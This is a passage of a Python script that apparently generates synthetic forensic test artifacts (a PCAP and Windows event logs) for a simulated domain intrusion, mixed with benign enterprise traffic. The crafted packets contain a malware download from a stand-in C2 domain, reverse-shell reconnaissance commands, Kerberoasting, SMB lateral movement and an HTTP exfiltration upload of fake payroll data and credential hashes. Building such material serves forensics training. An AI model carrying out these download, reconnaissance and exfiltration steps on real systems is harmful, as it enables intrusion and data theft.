#!/usr/bin/env python3
"""
Correlated Multi-Artifact Hacker Attack Scenario Generator: "Operation CobaltShadow"
Generates 3 tightly correlated forensic artifacts enriched with authentic enterprise background telemetry:
1. network_attack_capture.pcap (Network traffic capture on victim Host A: 10.0.4.15)
2. Security_WKSTN-FIN-01.evtx (Windows Event Log from victim Host A: 10.0.4.15)
3. Security_DC-PROD-01.evtx (Windows Event Log from Domain Controller Host B: 10.0.4.50)

Cross-Artifact Bindings & Indicators:
- Client IP: 10.0.4.15 (Host A: WKSTN-FIN-01)
- Target DC IP: 10.0.4.50 (Host B: DC-PROD-01)
- Default Gateway: 10.0.4.1
- Attacker C2 IP: 185.220.101.45 (evil-payloads-delivery.org, c2.evil-payloads-delivery.org)
- Attacker Reverse Shell IP: 194.26.29.112:4444
- Exfiltration Dropzone IP: 91.240.118.72 (dropzone-secure-exfil.com)
- Shared Malware Payload: beacon_updater.exe (Exact SHA-256 and MD5 matched across PCAP carving, WKSTN-01 Sysmon 1/11, and DC-01 Service 7045)
- Shared Stolen Exfil Archive: financial_q3_confidential.zip (Exact SHA-256 and MD5 matched across PCAP HTTP POST upload and WKSTN-01 7-Zip process execution)
- Stolen Credentials: svc_admin / P@ssw0rd2026!Summer# (Observed in PCAP cleartext HTTP POST, harvested on Host A, authenticated via LogonType 3 and elevated to SeDebugPrivilege on Host B)
- Cross-Host Lateral Movement: LogonType 3 network logon, SMB admin shares (\\\\DC-PROD-01\\ADMIN$, \\\\DC-PROD-01\\C$), and remote service creation (WindowsDefendUpdateSvc, PSEXESVC)
- Enterprise Noise: System startup, service lifecycle (7036), normal user interactive logons (4624/2), normal process launches (Explorer, RuntimeBroker, SearchApp, OneDrive, Outlook), legitimate DNS & web browsing, print spooling (307), workstation lock/unlock (4800/4801), and DC replication (4932/4933).
"""

import os
import struct
import socket
import hashlib
import zipfile
import io
import time
from datetime import datetime, timezone

OUT_DIR = "test-files/correlated_investigation"
os.makedirs(OUT_DIR, exist_ok=True)

# -------------------------------------------------------------------------
# 1. Deterministic Payload & Archive Synthesis
# -------------------------------------------------------------------------
def generate_pe_binary() -> bytes:
    """Builds a deterministic 512-byte PE binary with authentic DOS/PE headers."""
    dos = bytearray(128)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x14C, 1, 1760090400, 0, 0, 0, 0x0102)
    marker = b"CobaltStrike Beacon Payload Implant v4.9 - C2: 185.220.101.45:443 - Host: WKSTN-FIN-01\n"
    pe = bytes(dos[:64]) + pe_sig + coff + marker
    return pe.ljust(512, b"\x90")

PE_BYTES = generate_pe_binary()
PE_SHA256 = hashlib.sha256(PE_BYTES).hexdigest()
PE_MD5 = hashlib.md5(PE_BYTES).hexdigest()

def generate_exfil_zip() -> bytes:
    """Builds a deterministic ZIP archive containing exfiltrated financial & payroll records."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        z1 = zipfile.ZipInfo("payroll_q3_confidential.csv", date_time=(2026, 10, 10, 10, 1, 0))
        zf.writestr(
            z1,
            "EmployeeID,FullName,Title,Salary,SSN,BankRouting,BankAccount\n"
            "1042,John Doe,Finance Analyst,$95000,123-45-6789,021000021,9876543210\n"
            "1043,Jane Smith,VP Finance,$185000,987-65-4321,021000021,1234567890\n"
            "1044,Alice Johnson,Domain Admin,$140000,456-78-1234,021000021,5554443332\n"
        )
        z2 = zipfile.ZipInfo("domain_credentials_dump.txt", date_time=(2026, 10, 10, 10, 1, 0))
        zf.writestr(
            z2,
            "Target Domain: TARGET.LOCAL\n"
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
            "svc_admin:501:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
        )
    return buf.getvalue()

ZIP_BYTES = generate_exfil_zip()
ZIP_SHA256 = hashlib.sha256(ZIP_BYTES).hexdigest()
ZIP_MD5 = hashlib.md5(ZIP_BYTES).hexdigest()

print(f"[*] Generated Staged Binary: beacon_updater.exe ({len(PE_BYTES)} bytes)")
print(f"    SHA-256: {PE_SHA256}")
print(f"    MD5:     {PE_MD5}")
print(f"[*] Generated Exfil Archive: financial_q3_confidential.zip ({len(ZIP_BYTES)} bytes)")
print(f"    SHA-256: {ZIP_SHA256}")
print(f"    MD5:     {ZIP_MD5}")

# -------------------------------------------------------------------------
# 2. PCAP Construction Helpers
# -------------------------------------------------------------------------
def ip_to_bytes(ip_str: str) -> bytes:
    return socket.inet_aton(ip_str)

def checksum(data: bytes) -> int:
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def make_arp_packet(src_mac: bytes, dst_mac: bytes, op: int, sender_mac: bytes, sender_ip: str, target_mac: bytes, target_ip: str) -> bytes:
    """Builds a standard 60-byte Ethernet ARP frame (Op 1 = Request, Op 2 = Reply)."""
    eth_hdr = dst_mac + src_mac + b"\x08\x06"
    arp_body = struct.pack(
        "!HHBBH6s4s6s4s",
        1,               # Hardware type: Ethernet (1)
        0x0800,          # Protocol type: IPv4 (0x0800)
        6,               # Hardware size: 6
        4,               # Protocol size: 4
        op,              # Opcode: 1 (Request) or 2 (Reply)
        sender_mac,
        ip_to_bytes(sender_ip),
        target_mac,
        ip_to_bytes(target_ip)
    )
    # Pad to minimum Ethernet payload of 46 bytes (total frame 60 bytes)
    padding = b"\x00" * (46 - len(arp_body))
    return eth_hdr + arp_body + padding

def make_eth_ip_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, payload):
    eth_hdr = dst_mac + src_mac + b"\x08\x00"  # IPv4
    total_len = 20 + 20 + len(payload)
    ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 2468, 0x4000, 64, 6, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    ip_cksum = checksum(ip_hdr_no_cksum)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, 2468, 0x4000, 64, 6, ip_cksum,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    tcp_hdr_no_cksum = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, ack, (5 << 4), flags, 8192, 0, 0
    )
    pseudo_hdr = struct.pack("!4s4sBBH",
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip), 0, 6, 20 + len(payload)
    )
    tcp_cksum = checksum(pseudo_hdr + tcp_hdr_no_cksum + payload)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, ack, (5 << 4), flags, 8192, tcp_cksum, 0
    )
    return eth_hdr + ip_hdr + tcp_hdr + payload

def make_eth_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, payload):
    eth_hdr = dst_mac + src_mac + b"\x08\x00"
    udp_len = 8 + len(payload)
    ip_total_len = 20 + udp_len
    ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 5432, 0x4000, 64, 17, 0,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    ip_cksum = checksum(ip_hdr_no_cksum)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_total_len, 5432, 0x4000, 64, 17, ip_cksum,
        ip_to_bytes(src_ip), ip_to_bytes(dst_ip)
    )
    udp_hdr = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
    return eth_hdr + ip_hdr + udp_hdr + payload

def make_eth_ip_udp_dns(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, domain, resolved_ip=None, is_response=False, txid=0x4A21):
    if not is_response:
        dns_flags = 0x0100  # Standard query
        qdcount, ancount, nscount, arcount = 1, 0, 0, 0
        qname_parts = domain.split(".")
        qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)  # A record, IN class
        dns_body = struct.pack("!HHHHHH", txid, dns_flags, qdcount, ancount, nscount, arcount) + qname_bytes + qtype_qclass
    else:
        dns_flags = 0x8180  # Standard response, no error
        qdcount, ancount, nscount, arcount = 1, 1, 0, 0
        qname_parts = domain.split(".")
        qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        answer_ptr = struct.pack("!HHIH4s", 0xC00C, 1, 300, 4, ip_to_bytes(resolved_ip or "1.1.1.1"))
        dns_body = struct.pack("!HHHHHH", txid, dns_flags, qdcount, ancount, nscount, arcount) + qname_bytes + qtype_qclass + answer_ptr

    return make_eth_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, dns_body)

# -------------------------------------------------------------------------
# 3. Build Hacker Attack PCAP File
# -------------------------------------------------------------------------
def build_pcap():
    out_pcap = os.path.join(OUT_DIR, "06_network_traffic_capture.pcap")
    pcap_hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    packets = []

    mac_host_a = b"\x00\x50\x56\xAA\x11\x22"  # Host A WKSTN-FIN-01
    mac_router = b"\x00\x50\x56\xEE\x99\x88"  # Internal Gateway / Switch
    mac_dc = b"\x00\x50\x56\xBB\x33\x44"      # Host B DC-PROD-01
    mac_bcast = b"\xFF\xFF\xFF\xFF\xFF\xFF"

    ip_host_a = "10.0.4.15"
    ip_gw = "10.0.4.1"
    ip_dc = "10.0.4.50"
    ip_c2 = "185.220.101.45"
    ip_shell = "194.26.29.112"
    ip_exfil = "91.240.118.72"
    domain_c2 = "evil-payloads-delivery.org"
    domain_exfil = "dropzone-secure-exfil.com"

    # Base timestamps:
    # 09:30:00Z = 1760088600.0 (Morning startup & routine enterprise traffic)
    # 10:00:00Z = 1760090400.0 (Attack scenario phase)
    morning_ts = 1760088600.0
    attack_ts = 1760090400.0

    # -------------------------------------------------------------------------
    # PART A: Routine Enterprise Background Telemetry (09:30:00 - 09:55:00)
    # -------------------------------------------------------------------------
    # 1. ARP Resolution for Gateway
    packets.append((morning_ts + 1.0, make_arp_packet(mac_host_a, mac_bcast, 1, mac_host_a, ip_host_a, b"\x00"*6, ip_gw)))
    packets.append((morning_ts + 1.05, make_arp_packet(mac_router, mac_host_a, 2, mac_router, ip_gw, mac_host_a, ip_host_a)))

    # 2. ARP Resolution for DC-PROD-01
    packets.append((morning_ts + 2.0, make_arp_packet(mac_host_a, mac_bcast, 1, mac_host_a, ip_host_a, b"\x00"*6, ip_dc)))
    packets.append((morning_ts + 2.05, make_arp_packet(mac_dc, mac_host_a, 2, mac_dc, ip_dc, mac_host_a, ip_host_a)))

    # 3. Benign DNS Queries: Office 365, Teams, Google Connectivity Check
    benign_domains = [
        ("login.microsoftonline.com", "20.190.159.0", 53101, 10.0),
        ("teams.microsoft.com", "52.113.194.132", 53102, 25.0),
        ("connectivitycheck.gstatic.com", "142.250.190.35", 53103, 40.0),
        ("internal-portal.target.local", ip_dc, 53104, 60.0),
    ]
    for d_name, d_ip, s_port, offset in benign_domains:
        packets.append((morning_ts + offset, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, s_port, 53, d_name, is_response=False, txid=s_port)))
        packets.append((morning_ts + offset + 0.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, s_port, d_name, resolved_ip=d_ip, is_response=True, txid=s_port)))

    # 4. Benign HTTP Browsing of Internal Finance Portal (09:32:00)
    portal_req = (
        b"GET /portal/home.html HTTP/1.1\r\n"
        b"Host: internal-portal.target.local\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n"
        b"Accept: text/html,application/xhtml+xml\r\n\r\n"
    )
    packets.append((morning_ts + 120.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49720, 80, 100, 0, 0x18, portal_req)))

    portal_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: Microsoft-IIS/10.0\r\n"
        b"Content-Type: text/html; charset=utf-8\r\n"
        b"Content-Length: 142\r\n\r\n"
        b"<html><head><title>Finance Portal - TARGET CORP</title></head><body><h1>Welcome John Doe (Finance)</h1><p>Authorized access only.</p></body></html>"
    )
    packets.append((morning_ts + 120.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 80, 49720, 200, 100 + len(portal_req), 0x18, portal_resp)))

    # 5. Benign TLS Session to Microsoft Online (09:35:00)
    sni_msft = b"login.microsoftonline.com"
    tls_sni_msft = b"\x00\x00" + struct.pack("!H", len(sni_msft) + 5) + struct.pack("!H", len(sni_msft) + 3) + b"\x00" + struct.pack("!H", len(sni_msft)) + sni_msft
    tls_hs_msft = b"\x01\x00\x00\x70\x03\x03" + (b"\x22" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x30" + tls_sni_msft
    tls_rec_msft = b"\x16\x03\x01" + struct.pack("!H", len(tls_hs_msft)) + tls_hs_msft
    packets.append((morning_ts + 300.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "20.190.159.0", 49755, 443, 500, 0, 0x18, tls_rec_msft)))

    # -------------------------------------------------------------------------
    # PART B: Attack Scenario Phase (10:00:00 - 10:01:30)
    # -------------------------------------------------------------------------
    # Step 1: Reconnaissance Web Search for AMSI bypass & C2 cradle (t + 1s)
    s1_req = (
        b"GET /search?q=powershell+downloadstring+cradle+amsi+bypass+mimikatz HTTP/1.1\r\n"
        b"Host: www.google.com\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        b"Accept: text/html,application/xhtml+xml\r\n\r\n"
    )
    packets.append((attack_ts + 1.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "142.250.190.46", 49801, 80, 1000, 0, 0x18, s1_req)))
    s1_resp = b"HTTP/1.1 200 OK\r\nServer: gws\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 64\r\n\r\n<html><body>Google Search Results: AMSI Bypass & C2</body></html>"
    packets.append((attack_ts + 1.1, make_eth_ip_tcp(mac_router, mac_host_a, "142.250.190.46", ip_host_a, 80, 49801, 2000, 1000 + len(s1_req), 0x18, s1_resp)))

    # Step 2: DNS Query for C2 Domain (t + 5s)
    p_dns_q = make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53210, 53, domain_c2, is_response=False, txid=0x5A01)
    p_dns_r = make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53210, domain_c2, resolved_ip=ip_c2, is_response=True, txid=0x5A01)
    packets.append((attack_ts + 5.0, p_dns_q))
    packets.append((attack_ts + 5.05, p_dns_r))

    # Step 3: HTTP Download of Staged Binary beacon_updater.exe (t + 7s & 7.5s)
    s3_req = (
        f"GET /beacon_updater.exe HTTP/1.1\r\n"
        f"Host: {domain_c2}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Accept: */*\r\n\r\n"
    ).encode("ascii")
    packets.append((attack_ts + 7.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49810, 80, 3000, 0, 0x18, s3_req)))

    s3_resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: nginx/1.24.0\r\n"
        "Content-Type: application/x-msdownload\r\n"
        "Content-Disposition: attachment; filename=\"beacon_updater.exe\"\r\n"
        f"Content-Length: {len(PE_BYTES)}\r\n\r\n"
    ).encode("ascii") + PE_BYTES
    packets.append((attack_ts + 7.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_c2, ip_host_a, 80, 49810, 4000, 3000 + len(s3_req), 0x18, s3_resp)))

    # Step 4: TLS Client Hello with SNI to C2 Server (t + 12.0s)
    sni_hostname = f"c2.{domain_c2}".encode("ascii")
    tls_sni_ext = b"\x00\x00" + struct.pack("!H", len(sni_hostname) + 5) + struct.pack("!H", len(sni_hostname) + 3) + b"\x00" + struct.pack("!H", len(sni_hostname)) + sni_hostname
    tls_handshake = b"\x01\x00\x00\x70\x03\x03" + (b"\x11" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x30" + tls_sni_ext
    tls_record = b"\x16\x03\x01" + struct.pack("!H", len(tls_handshake)) + tls_handshake
    packets.append((attack_ts + 12.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49811, 443, 5000, 0, 0x18, tls_record)))

    # Step 5: C2 Periodic Beaconing Pulses (Every 4.0 seconds from t+16.0 to t+60.0 - 12 pulses with jitter)
    for i in range(12):
        ts_pulse = attack_ts + 16.0 + (i * 4.0) + (0.1 * (i % 3))
        beacon_data = f"POST /c2/pulse HTTP/1.1\r\nHost: {domain_c2}\r\nContent-Length: 16\r\n\r\nBEACON_HEARTBEAT".encode("ascii")
        packets.append((ts_pulse, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 6000 + (i * 100), 0, 0x18, beacon_data)))

    # Step 6: Cleartext Credential Interception on Internal Web Portal (t + 22s)
    s6_post = (
        b"POST /api/v1/auth/login HTTP/1.1\r\n"
        b"Host: internal-portal.target.local\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 88\r\n\r\n"
        b"username=svc_admin&password=P%40ssw0rd2026%21Summer%23&domain=TARGET&submit=Domain+Logon"
    )
    packets.append((attack_ts + 22.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49815, 80, 7000, 0, 0x18, s6_post)))
    s6_resp = b"HTTP/1.1 200 OK\r\nServer: Microsoft-IIS/10.0\r\nContent-Type: application/json\r\nContent-Length: 35\r\n\r\n{\"status\":\"authenticated\",\"role\":\"admin\"}"
    packets.append((attack_ts + 22.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 80, 49815, 8000, 7000 + len(s6_post), 0x18, s6_resp)))

    # Step 7: Interactive Reverse Shell / Terminal Session (t + 26s to t + 36s)
    # Attacker shell redirector on 194.26.29.112:4444 (TCP Reverse Shell)
    # Banner
    packets.append((attack_ts + 26.0, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 100, 9000, 0x18, b"Microsoft Windows [Version 10.0.19045.3803]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 27.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9000, 200, 0x18, b"whoami\r\n")))
    packets.append((attack_ts + 27.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 200, 9008, 0x18, b"target\\jdoe\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 28.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9008, 230, 0x18, b"net user /domain\r\n")))
    packets.append((attack_ts + 29.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 230, 9026, 0x18, b"User accounts for \\\\DC-PROD-01:\r\nAdministrator   jdoe   svc_admin   backup_admin   sql_svc   adm_john   krbtgt\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 30.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9026, 320, 0x18, b"net group \"Domain Admins\" /domain\r\n")))
    packets.append((attack_ts + 31.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 320, 9060, 0x18, b"Group name     Domain Admins\r\nMembers        Administrator, svc_admin\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 32.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9060, 410, 0x18, b"nltest /dclist:target.local\r\n")))
    packets.append((attack_ts + 33.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 410, 9089, 0x18, b"Get list of DCs in domain 'target.local' from '\\\\DC-PROD-01'.\r\n    DC-PROD-01.target.local [PDC] [DS] [Site: Default-First-Site-Name]\r\nThe command completed successfully.\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 34.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9089, 570, 0x18, b"powershell -Command \"Get-Process lsass\"\r\n")))
    packets.append((attack_ts + 35.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 570, 9128, 0x18, b"Handles  NPM(K)  PM(K)  WS(K)  Id ProcessName\r\n-------  ------  -----  -----  -- -----------\r\n   1240      42  18450  24600 684 lsass\r\nC:\\Users\\jdoe> ")))
    packets.append((attack_ts + 36.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9128, 650, 0x18, b"dir \"C:\\Users\\jdoe\\Documents\\Finance\"\r\n")))
    packets.append((attack_ts + 36.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 650, 9166, 0x18, b" Directory of C:\\Users\\jdoe\\Documents\\Finance\r\n\r\n10/10/2026  10:01 AM    payroll_q3_confidential.csv\r\n10/10/2026  10:01 AM    domain_credentials_dump.txt\r\nC:\\Users\\jdoe> ")))

    # Step 8: Kerberos Kerberoasting Request on Port 88 (t + 37.0s)
    # TGS-REQ targeting MSSQLSvc SPN on DC
    kerb_req = b"\x6c\x81\x92\x30\x81\x8f\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0c\xa4\x81\x82\x30\x80\xa0\x07\x03\x05\x00\x40\x81\x00\x00\xa2\x2f\x30\x2d\xa0\x03\x02\x01\x02\xa1\x26\x30\x24\x1b\x08MSSQLSvc\x1b\x18dc-prod-01.target.local"
    packets.append((attack_ts + 37.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49822, 88, 10000, 0, 0x18, kerb_req)))
    kerb_resp = b"\x6d\x81\x98\x30\x81\x95\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x0d\xa2\x81\x88\x30\x81\x85\xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x79\x04\x77" + (b"\xAA" * 119)
    packets.append((attack_ts + 37.2, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 88, 49822, 11000, 10000 + len(kerb_req), 0x18, kerb_resp)))

    # Step 9: Lateral Movement Connections to DC-PROD-01 (t + 38s to t + 44s)
    # SMB Connection on 445:
    smb_neg = b"\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x00\x00\x00\x22\x00\x02NT LM 0.12\x00\x02SMB 2.002\x00"
    packets.append((attack_ts + 38.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12000, 0, 0x18, smb_neg)))
    smb_neg_resp = b"\x00\x00\x00\x2b\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x98\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x01\x00\x11\x00"
    packets.append((attack_ts + 38.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 445, 52100, 13000, 12000 + len(smb_neg), 0x18, smb_neg_resp)))

    # SMB Session Setup with svc_admin credentials
    smb_sess = b"\x00\x00\x00\x58\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x0c\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00svc_admin\x00TARGET\x00"
    packets.append((attack_ts + 39.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12000 + len(smb_neg), 13000 + len(smb_neg_resp), 0x18, smb_sess)))

    # SMB Tree Connect to \\DC-PROD-01\ADMIN$
    smb_tree = b"\x00\x00\x00\x4c\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x04\xff\x00\x00\x00\x00\x00\x20\x00\\\\DC-PROD-01\\ADMIN$\x00?????\x00"
    packets.append((attack_ts + 40.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12150, 13050, 0x18, smb_tree)))

    # RDP Connection Request on 3389:
    rdp_cr = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
    packets.append((attack_ts + 42.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52101, 3389, 14000, 0, 0x18, rdp_cr)))
    rdp_cc = b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x00\x08\x00\x03\x00\x00\x00"
    packets.append((attack_ts + 42.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 3389, 52101, 15000, 14000 + len(rdp_cr), 0x18, rdp_cc)))

    # Step 10: DNS & Data Exfiltration via HTTP POST (t + 55s to t + 58s)
    p_exfil_dns_q = make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53215, 53, domain_exfil, is_response=False, txid=0x5B01)
    p_exfil_dns_r = make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53215, domain_exfil, resolved_ip=ip_exfil, is_response=True, txid=0x5B01)
    packets.append((attack_ts + 55.0, p_exfil_dns_q))
    packets.append((attack_ts + 55.1, p_exfil_dns_r))

    # Exfiltration upload POST request
    s9_post_req = (
        f"POST /upload/financial_q3_confidential.zip HTTP/1.1\r\n"
        f"Host: {domain_exfil}\r\n"
        f"Content-Type: application/zip\r\n"
        f"Content-Disposition: attachment; filename=\"financial_q3_confidential.zip\"\r\n"
        f"Content-Length: {len(ZIP_BYTES)}\r\n\r\n"
    ).encode("ascii") + ZIP_BYTES
    packets.append((attack_ts + 57.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_exfil, 49830, 80, 16000, 0, 0x18, s9_post_req)))

    # Exfiltration response body with carved confirmation payload
    s9_post_resp = (
        "HTTP/1.1 200 OK\r\n"
        "Server: Apache/2.4.52\r\n"
        "Content-Type: application/zip\r\n"
        "Content-Disposition: attachment; filename=\"financial_q3_confidential.zip\"\r\n"
        f"Content-Length: {len(ZIP_BYTES)}\r\n\r\n"
    ).encode("ascii") + ZIP_BYTES
    packets.append((attack_ts + 58.0, make_eth_ip_tcp(mac_router, mac_host_a, ip_exfil, ip_host_a, 80, 49830, 17000, 16000 + len(s9_post_req), 0x18, s9_post_resp)))

    # Sort packets strictly by timestamp
    packets.sort(key=lambda p: p[0])

    pcap_bytes = io.BytesIO()
    pcap_bytes.write(pcap_hdr)
    for ts, pkt in packets:
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1e6)
        pcap_bytes.write(struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt)) + pkt)

    raw_pcap = pcap_bytes.getvalue()
    with open(out_pcap, "wb") as f:
        f.write(raw_pcap)

    print(f"[+] Successfully wrote PCAP: {out_pcap} ({len(packets)} packets)")

# -------------------------------------------------------------------------
# 4. Build Windows Event Log File: Security_WKSTN-FIN-01.evtx (Host A)
# -------------------------------------------------------------------------
def build_host_a_evtx():
    out_file = os.path.join(OUT_DIR, "04_endpoint_workstation_hostA.evtx")

    xml_content = f"""<Events>
  <!-- ===================================================================== -->
  <!-- SECTION A: Normal Enterprise Startup, System Services & User Telemetry -->
  <!-- ===================================================================== -->

  <!-- 1. System Boot: Event Log Service Started (6005) at 09:30:00Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6005</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:00.000Z" />
      <EventRecordID>4901</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="Binary">00000000</Data>
    </EventData>
  </Event>

  <!-- 2. System Boot: Operating System Version (6009) at 09:30:02Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="EventLog" />
      <EventID>6009</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:02.000Z" />
      <EventRecordID>4902</EventRecordID>
      <Channel>System</Channel>
      <Computer>WKSTN-FIN-01.target.local</Computer>
    </System>
    <EventData>
      <Data Name="MajorVersion">10</Data>
      <Data Name="MinorVersion">0</Data>
      <Data Name="BuildNumber">19045</Data>
      <Data Name="ServicePack">Enterprise</Data>
    </EventData>
  </Event>

  <!-- 3. Service Control Manager: Cryptographic Services running (7036) at 09:30:05Z -->
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Service Control Manager" Guid="{{555908d1-a6d7-4695-8e1e-26931d2012f4}}" />
      <EventID>7036</EventID>
      <TimeCreated SystemTime="2026-10-10T09:30:05.000Z" />
      <EventRecordID>4903</EventRecordID>
      <Channel>System</Channel>
